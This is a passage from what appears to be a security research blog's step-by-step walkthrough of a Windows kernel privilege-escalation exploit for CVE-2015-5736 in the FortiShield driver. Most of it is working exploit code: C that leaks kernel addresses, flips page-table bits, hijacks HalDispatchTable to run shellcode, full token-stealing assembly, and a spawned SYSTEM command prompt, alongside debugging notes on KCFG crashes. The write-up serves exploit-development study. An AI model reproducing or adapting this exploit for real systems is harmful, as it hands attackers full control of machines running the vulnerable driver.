<p>The code chunk then leaks the base address of fortishield with the leakFortiBase() function and sets the fortishield_callback and fortishield_restore variables. These variables are used to hijack and restore execution in the vulnerable fortishield IOCTL.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">ULONGLONG</span> <span class="n">eProcess</span><span class="p">;</span>
	<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">forti_exploit</span> <span class="o">=</span> <span class="s">"kstack.exe"</span><span class="p">;</span>
	<span class="n">eProcess</span> <span class="o">=</span> <span class="n">GetEprocessAddress</span><span class="p">(</span><span class="n">forti_exploit</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] EPROCESS found %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">eProcess</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">kThread</span> <span class="o">=</span> <span class="n">walkEprocess</span><span class="p">(</span><span class="n">mdare</span><span class="p">,</span> <span class="n">eProcess</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">ntBase</span> <span class="o">=</span> <span class="n">leakNtBase</span><span class="p">(</span><span class="n">mdare</span><span class="p">,</span> <span class="n">kThread</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] ntoskrnl.exe base address is: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntBase</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">ntPivot</span> <span class="o">=</span> <span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x20bbc2</span><span class="p">;</span> <span class="c1">// mov esp, 0xB60F0020 ; ret // mov esp, 0xf6000000; retn;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] stack pivot gadget found: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntPivot</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">ntMiGetPteAddressOffset</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x33273B</span><span class="p">,</span> <span class="n">mdare</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] ntMiGetPteAddressOffset is: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntMiGetPteAddressOffset</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">fortishieldBase</span> <span class="o">=</span> <span class="n">leakFortiBase</span><span class="p">(</span><span class="n">mdare</span><span class="p">,</span> <span class="n">ntBase</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] FortiShield.sys base address is: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fortishieldBase</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">fortishield_callback</span> <span class="o">=</span> <span class="n">fortishieldBase</span> <span class="o">+</span> <span class="mh">0xd150</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">fortishield_restore</span> <span class="o">=</span> <span class="n">fortishieldBase</span> <span class="o">+</span> <span class="mh">0x2f73</span><span class="p">;</span>
</code></pre></div></div>
<p>This chunk then prints the PTE Virtual Address base address and finds the PTE of the fake stack address with get_pxe_address_64 and then allocates the fake stack and builds the ROP chain with allocate_fake_stack().</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PTE VA start address is: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntMiGetPteAddressOffset</span><span class="p">);</span>


	<span class="n">ULONGLONG</span> <span class="n">pte_result</span> <span class="o">=</span> <span class="n">get_pxe_address_64</span><span class="p">(</span><span class="mh">0xB60f0000</span><span class="p">,</span> <span class="n">ntMiGetPteAddressOffset</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PTE virtual address for 0x0B60F0100: %I64x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pte_result</span><span class="p">);</span>
	<span class="n">PULONGLONG</span> <span class="n">fake_stack</span> <span class="o">=</span> <span class="n">allocate_fake_stack</span><span class="p">(</span><span class="n">ntBase</span><span class="p">,</span> <span class="n">fortishield_callback</span><span class="p">,</span> <span class="n">fortishield_restore</span><span class="p">,</span> <span class="n">kThread</span><span class="p">);</span>
</code></pre></div></div>
<p>This chunk sets up the call to the vulnerable IOCTL for CVE-2015-5736, calls the IOCTL, and then triggers the callback with trigger_callback(). The getchar() calls allow for delaying the execution of code to help with troubleshooting and debugging. They can be commented out or removed.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">DWORD</span> <span class="n">IoControlCode</span> <span class="o">=</span> <span class="mh">0x220028</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">InputBuffer</span> <span class="o">=</span> <span class="n">ntPivot</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">InputBufferLength</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">OutputBuffer</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">OutputBufferLength</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">lpBytesReturned</span><span class="p">;</span>

	<span class="n">getchar</span><span class="p">();</span>

	<span class="n">BOOL</span> <span class="n">triggerIOCTL</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">forti</span><span class="p">,</span> <span class="n">IoControlCode</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="o">&amp;</span><span class="n">InputBuffer</span><span class="p">,</span> <span class="n">InputBufferLength</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="o">&amp;</span><span class="n">OutputBuffer</span><span class="p">,</span> <span class="n">OutputBufferLength</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">trigger_callback</span><span class="p">();</span>
</code></pre></div></div>
<p>This chunk sleeps to ensure that the callback had enouugh time to finish and then allocates user-mode memory at 0x00000002a0000000, uses get_pxe_address64() to retrieve the PTE Virtual Address. It uses ReadProcessMemory to read the value and print it to the screen. It then stores the shellcode in the user-mode memory we allocated and uses the write NtWriteVirtualMemory write primitive to flip the U/S bit to make it appear to be in supervisor mode or kernel-mode.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">Sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
	<span class="n">LPVOID</span> <span class="n">read_qword</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>
	<span class="n">SIZE_T</span> <span class="n">read_bytes</span><span class="p">;</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">read_qword</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>

	<span class="n">PULONGLONG</span> <span class="n">ppte_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ntMiGetPteAddressOffset</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ppte_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while reading from nt!MiGetPteAddress + 0x13</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PTE base address: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">ppte_base</span><span class="p">);</span>

	<span class="n">ULONGLONG</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="mh">0x00000002a0000000</span><span class="p">;</span>
	<span class="n">LPVOID</span> <span class="n">allocation_sc</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">allocation_sc</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while allocating memory for the input buffer: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">allocation_sc</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>

	<span class="n">memcpy</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">allocation_sc</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">TokenStealing</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">);</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocation_sc</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">fortishield_callback</span><span class="p">;</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocation_sc</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">fortishield_restore</span><span class="p">;</span>

	<span class="n">ULONGLONG</span> <span class="n">pte_base</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">ppte_base</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">pte_va</span> <span class="o">=</span> <span class="n">get_pxe_address_64</span><span class="p">(</span><span class="mh">0x00000002a0000000</span><span class="p">,</span> <span class="n">pte_base</span><span class="p">);</span>

	<span class="n">memset</span><span class="p">(</span><span class="n">read_qword</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pte_va</span><span class="p">,</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">ppte_entry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PTE flags: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">ppte_entry</span><span class="p">);</span>
	<span class="c1">//Flip U/S bit</span>
	<span class="n">ULONGLONG</span> <span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">ppte_entry</span> <span class="o">^</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">;</span>
	<span class="n">_NtWriteVirtualMemory</span> <span class="n">pNtWriteVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtWriteVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtWriteVirtualMemory"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pNtWriteVirtualMemory</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while resolving NtWriteVirtualMemory: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pte_va</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>
<p>This chunk uses the read primitive to retrieve the value of HalDispatchTable+0x08 so that we can save the original value that points to HaliQuerySystemInformation. It then saves the address on the fake stack so that the shellcode can reference it when it restores execution following the token steal. It then uses the write primitive to overwrite HalDispathTable+0x08 with the shellcode address and triggers the call to it with NtQueryIntervalProfile. The ULONG trash is just a ULONG variable declared to pass it’s pointer to NtQueryIntervalProfile and serves no other purpose.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
	<span class="n">ULONGLONG</span> <span class="n">HaliQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0xc00a68</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">,</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">orig_HaliQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Oringial HaliQuerySystemInformation Address: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">);</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10200</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">;</span>

	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">_NtQueryIntervalProfile</span> <span class="n">pNtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pNtQueryIntervalProfile</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while resolving NtQueryIntervalProfile: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">ULONG</span> <span class="n">trash</span><span class="p">;</span>
	<span class="n">pNtQueryIntervalProfile</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">trash</span><span class="p">);</span>
</code></pre></div></div>
<p>This final chunk halts with getchar() to delay execution and then sleeps for 2 seconds, a little redundant but ensures a delay if you just happy click through. It then uses the write primitive to restore the HalDisptachTable+0x08 to HaliQuerySystemInformation and restores the PreviousMode on the KTHREAD before spawning cmd.exe and exiting.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">Sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
	<span class="c1">//restore the HalDispatchTable</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">//restore Previous Mode on the KThread</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">read_qword</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">),</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">kThreadPM</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">kThreadPM</span> <span class="o">^</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"start cmd.exe"</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="err">}</span>
</code></pre></div></div>
<p>This token stealing shellcode is in the repo <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/kstack/token_stealing.asm">token_stealing.asm</a>. The token stealing shell code finds the EPROCESS of our current process and walks the ActiveProcessLink to find the SYSTEM Process with PID 4. It then copies its token over our token. It then restores register values and loads the original HaliQuerySystemInformation address to rax and performs a jmp rax. This restores execution to HaliQuerySystemInformation to avoid a bugcheck if we just return from our shellcode instead of continuing to the legitimate function we hijacked.</p>
<pre><code class="language-asm">_TEXT	SEGMENT

TokenStealing PROC
	get_eproc:
	nop
	nop
	nop
	nop
	nop
	push	rax										;save registers
	push	rcx										;
	push	r9										;
	push	r8										;
	xor     rax, rax								;Get the EPROCESS of current Process
	mov     rax, qword ptr gs:[rax+188h]			;
	mov     rax, qword ptr [rax+0B8h]				;
	mov     r8, rax									;
	parse_eproc:
	mov     rax, qword ptr [rax+448h]				;walk the linked process list to find SYSTEM process
	sub     rax, 448h								;
	mov     rcx, qword ptr [rax+440h]				;
	cmp     rcx, 4									;
	jne     parse_eproc								;
	steal_token:
	mov     r9, qword ptr [rax+4B8h]				;copy SYSTEM process token to current process
	mov     qword ptr [r8+4B8h], r9					;
	pop		r8										;restire registers
	pop		r9										;
	pop		rcx										;
	pop		rax										;we are about to overwrite this one but stack allignment is a thing
	mov		rax, qword ptr [0b60f0200h]				;HaliQuerySystemInformation
	jmp		rax
	ret

TokenStealing ENDP

_TEXT	ENDS

End
</code></pre>

<p>If we run this code we will see the VM freeze once it starts perfoming the HalDispatchTable hijack and when we switch to the debugger we see a crash with a 0x139 bugcheck. This was confusing to troubleshoot at first because it mentioned a stack overflow in the full dump from !analyze -v (that detailed dump does not work on my testing VM for this scenario for some reason). The code is actually a KERNEL_SECURITY_CHECK_FAILURE. Arguments 1-3 were null and not relevant in this crash, however, argument 4 showed the user-mode address allocated for the shellcode.
<img src="/assets/images/post2-bugcheck-run.png" alt="post2-bugcheck-run" /><img src="/assets/images/post2-windbg-bugcheck.png" alt="post2-windbg-bugcheck" />
I mentioned earlier in the blog that we are doing this the hard way and that it would be easier to just call the vulnerable CVE-2015-5736 IOCTL again, or double call as I like to call that method. I will briefly go over that  to show that we can run shellcode from user-mode addresses with this exploit using other methods as we troubleshoot why we cannot run shellcode from a user-mode address when we use the HalDispatchTable method. If we were to use a double call to the CVE-2015-5736 IOCTL setting the callback to the user-mode address on the second call we would successfully get a SYSTEM command shell without a crash. I’ll save you reading space by not copying the full code here. There is only minor changes in the main() function and the shellcode. You can find the code on the repo <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/doublecall.cpp">doublecall.cpp</a> <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/doublecall.asm">doublecall.asm</a> Replace the code in the kstack.cpp file with the code from doublecall.cpp and replace the code in token_stealing.asm with the code in doublecall.asm if you want to try it out.</p>

<p><img src="/assets/images/post2-doublecall.png" alt="post2-doublecall" /></p>

<p>We see that we can execute code in kernel-mode from a user-mode memory address if we do the double call to the vulnerable IOCTL so why does it crash if we hijack the HalDispatchTable? Connor McGarr actually gave a talk at BlackHat USA 2025 about CFG (the user-mode version) and KCFG. In it he notes that KCFG acts like software Supervisor Mode Execution Prevention (SMEP). Even if HVCI is disabled KCFG will still act as software SMEP and monitor indirect calls on KCFG protected functions to ensure they never invoke a user-mode address. <a href="https://i.blackhat.com/BH-USA-25/Presentations/USA-25-McGarr-Out-Of-Control-KCFG-And-KCET.pdf">Connor McGarr BHUSE25</a></p>

<p>We saw during our RE that KeQueryIntervalProfile had a call to KCFG (guard_dispatch_icall). This monitors the indirect call and since it sees a user-mode address it will initiate a bugcheck and crash the system. This is evident in the call stack (k command in WinDbg). We see from the call stack that nt!KeQueryIntervalProfile+0x3e calls nt!guard_icall_bugcheck+0x1b and then we progress through the bugcheck crash.</p>

<p><img src="/assets/images/post2-ida-kequeryintervalprofile-2.png" alt="post2-ida-kequeryintervalprofile-2" /></p>

<p><img src="/assets/images/post2-windbg-callstack.png" alt="post2-windbg-callstack" /></p>

<p>So to fix this we either need to pivot to a method that does not include the KCFG indirect call check or use a kernel-mode address to host our shellcode. We already know we can use another call to fortishield to call our shellcode without KCFG interfering so we will search for a kernel-mode address to make the HalDispatchTable hijack work. Again, we must remember that HVCI is disabled in this scenario as it would prevent dynamic code and would not allow kernel memory to be writable and executable at the same time. There is also Mode Based Execution Control (MBEC) which is a  hardware feature enabled in the CPU to prevent user-mode addresses that are executable from becoming kernel-mode address. HVCI and VBS require a CPU that supports MBEC to prevent reduced performance, but Windows will not use MBEC if HVCI\VBS are disabled even though it is a hardware based mitigation. <a href="https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity?tabs=security">HVCI</a> <a href="https://community.intel.com/t5/Mobile-and-Desktop-Processors/HVCI-and-MBEC/m-p/1300305">MBEC</a></p>

<p>To use a kernel-mode address for our shellcode we must either already know the address or be able to leak it. It needs to be writable and executable. We could use the concept of a code cave where we find a null page (0x1000 bytes) in the .text section of a module we do have the address for, which is currently nt and fortishield. We could then use the write primitive to make the page writable to copy our shellcode and the use the write primitive to restore it to Read-only and execute. This could lead to a problem with crashing due to PatchGuard detecting our changes to loaded kernel modules if we are not able to make changes, execute shellcode, and restore everything back to normal.</p>

<p>There is another option though. If we dump our KTHREAD for our exploit in WinDbg and check the stack we can see more than enough unused space towards the stack base to host our shellcode.</p>

<p><img src="/assets/images/post2-windbg-find-kthread.png" alt="post2-windbg-find-kthread" /></p>

<p><img src="/assets/images/post2-windbg-kstack.png" alt="post2-windbg-kstack" /></p>

<p>Manipulating the KSTACK could cause stability issues or other bugs, but we are only using this executable to run our exploit and elevate our process to SYSTEM by stealing the SYSTEM token. We could write our shellcode close to the base, make it executable, and then write this address to HalDsipatchTable+0x8. After elevating our process to system we would then restore the KSTACK to non-executable, restore the HalDispatchTable, and reset the U/S bit on our KTHREAD and spawn a cmd prompt. We will generate a bugcheck if we attempt to use system(“start cmd.exe”) without resetting the U/S bit as the kernel should not be making a user-mode call to start cmd.exe. This is because we are attempting to call cmd.exe instance from user-mode with system(“start cmd.exe”) while our thread is still marked as kernel-mode.  We will notice an access violation in WinDbg because the kernel-mode thread tries to access user-mode address space. If we hit g to continue we will hit a continuous loop of access violations. If we set WinDbg to ignore access violations our exploit just freezes until another process generates a bug check due to the kernel being tied up in the endless access violation loop. We can verify this by commenting out line 530:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	//pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)kThread + 0x232), &amp;write_what, sizeof(ULONGLONG), NULL);
</code></pre></div></div>

<p><img src="/assets/images/post2-kstack-crash.png" alt="post2-kstack-crash" /></p>

<p><img src="/assets/images/post2-windbg-access-violation-1.png" alt="post2-windbg-access-violation-1" /></p>

<p><img src="/assets/images/post2-windbg-settings.png" alt="post2-windbg-settings" /></p>

<p><img src="/assets/images/post2-windbg-access-violation.png" alt="post2-windbg-access-violation" /></p>

<p><img src="/assets/images/post2-windbg-kstack-crash.png" alt="post2-windbg-kstack-crash" /></p>

<p>The working code is mostly the same as the original code until line 429 in the main() function. I will only post from 429 down here and you can view the full code in the repo <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/kstack/kstack.cpp">kstack.cpp</a>. The logic is mostly the same, except we do not allocate a user-mode address and flip the U/S bit. Instead we find the Kernel Stack Base (StackBase) from the KTHREAD and subtract 0x100 from it. The value in StackBase is address after the stack ends and could be invalid or belong to something else if it is valid. Trying to read/write to an invalid page will cause a bugcheck. If it is a valid address that belongs to another process or thread then there is no telling what issues it will cause. We store the shellcode in our KSTACK code cave and then make that page executable by enumerating the PTE just like we did for the user-mode address and then flip the NX bit instead of the U/S bit. We then perform our HalDispatchTableHijack and call NtQueryIntervalProfile. After our shellcode runs we restore the HalDispatchTable, reset our U/S bit on the KTHREAD to avoid generating a bugcheck when we spawn cmd.exe as SYSTEM, and then exit thus killing our thread and it’s KSTACK. There are no changes to the shellcode from the 